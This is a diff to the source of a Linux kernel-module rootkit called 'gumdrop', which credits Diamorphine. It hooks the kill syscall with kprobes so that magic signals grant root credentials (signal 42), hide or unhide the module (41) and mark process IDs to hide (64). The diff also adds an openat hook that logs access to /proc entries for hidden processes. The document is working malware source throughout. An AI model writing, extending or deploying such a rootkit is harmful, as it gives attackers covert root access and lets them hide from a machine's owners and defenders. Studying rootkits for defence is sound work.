@@ -26,6 +26,9 @@ struct kobject *parent;
 struct kobject *returnval;
 const char *name;
 
+pid_t HIDE_ME[32];
+size_t HIDE_ME_COUNT = 0;
+
 static inline void
 tidy(void) { // more sneaky beaky stuff (copied from Diamorphine)
   // Freeing
@@ -98,11 +101,47 @@ void give_woot(pid_t target_pid) {
   rcu_assign_pointer(task->cred, newcreds);
   rcu_read_unlock();
 }
+
+static bool is_hidden(pid_t pid) {
+  int i;
+  for (i = 0; i < 32; i++) {
+    if (HIDE_ME[i] == pid) {
+      return true;
+    }
+  }
+  return false;
+}
+
+static int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
+  struct pt_regs *real_regs;
+  const char __user *user_filename;
+  char filename[256];
+  long bytes;
+  pid_t target_pid;
+
+  real_regs = (struct pt_regs *)regs->di;
+  user_filename = (const char __user *)real_regs->si;
+  bytes = strncpy_from_user(filename, user_filename, sizeof(filename) - 1);
+
+  if (bytes > 0) {
+    filename[bytes] = '\0';
+    if (sscanf(filename, "/proc/%d/", &target_pid) == 1) {
+      if (is_hidden(target_pid)) {
+        printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n", filename,
+               current->comm, current->pid);
+      }
+    }
+  }
+
+  return 0;
+}
+
 static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
   unsigned long *stack = (unsigned long *)regs->sp; // skip rest of system call
   return *stack;
 }
-static struct kprobe kp;
+static struct kprobe kp[2];
+
 static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
   int sig;
   struct pt_regs *real_regs;
@@ -110,11 +149,11 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
   sig = (int)real_regs->si;
   pid_t target_pid;
   target_pid = current->pid;
-  pid_t source_pid = (pid_t)real_regs->di;
+  pid_t kill_this_pid = (pid_t)real_regs->di;
   if (sig == 42 &&
       target_pid ==
-          source_pid) { // if the signal code is 42 and if the process
-                        // being targeted is the same as the source PID
+          kill_this_pid) { // if the signal code is 42 and if the process
+                           // being targeted is the same as the source PID
 
     printk(KERN_INFO "the answer to everything!\n"); // 42!
     give_woot(target_pid); // give the current pid root
@@ -124,7 +163,7 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
         regs); // essentially "block" the signal from reaching the process.
     return 1;
   }
-  if (sig == 41 && target_pid == source_pid) { // hide and unhide the kit
+  if (sig == 41 && target_pid == kill_this_pid) { // hide and unhide the kit
     if (hidden == 0) {
 
       hide_module();
@@ -136,25 +175,52 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
     regs->ip = get_syscall_return_addr(regs);
     return 1;
   }
+  if (sig == 64) {
+    // hide processes
+    int i;
+    for (i = 0; i < 32; i++) {
+      if (HIDE_ME[i] == kill_this_pid) {
+        printk(KERN_INFO "unhiding: %d\n", kill_this_pid);
+        HIDE_ME[i] = 0;
+        regs->ax = 0;
+        regs->ip = get_syscall_return_addr(regs);
+        return 1;
+      }
+    }
+    printk(KERN_INFO "hiding: %d\n", kill_this_pid);
+    HIDE_ME[HIDE_ME_COUNT++] = kill_this_pid;
+    regs->ax = 0;
+    regs->ip = get_syscall_return_addr(regs);
+    return 1;
+  }
 
   return 0;
 }
 
 static int __init gumdrop_init(void) {
-  kp.symbol_name = "__x64_sys_kill";  // specify symbol for "kill"
-  kp.pre_handler = haha_funny_number; // function for when kill is detected
-  int ret = register_kprobe(&kp);
+  kp[0].symbol_name = "__x64_sys_kill";  // specify symbol for "kill"
+  kp[0].pre_handler = haha_funny_number; // function for when kill is detected
+  int ret = register_kprobe(&kp[0]);
   if (ret < 0) {
-    printk(KERN_INFO "cannot register %d!\n", ret);
+    printk(KERN_INFO "cannot register kill %d!\n", ret);
+    return ret;
+  }
+  kp[1].symbol_name = "__x64_sys_openat";
+  kp[1].pre_handler = monitor_handle;
+  ret = register_kprobe(&kp[1]);
+  if (ret < 0) {
+    printk(KERN_INFO "cannot register openat %d\n", ret);
+    return ret;
   }
   printk(KERN_INFO "Hewo pwincess!\n");
-  hide_module();
+  // hide_module();
   // tidy();
   return ret;
 }
 
 static void __exit gumdrop_exit(void) {
-  unregister_kprobe(&kp);
+  unregister_kprobe(&kp[0]);
+  unregister_kprobe(&kp[1]);
   printk(KERN_INFO "bye!\n");
   return;
 }
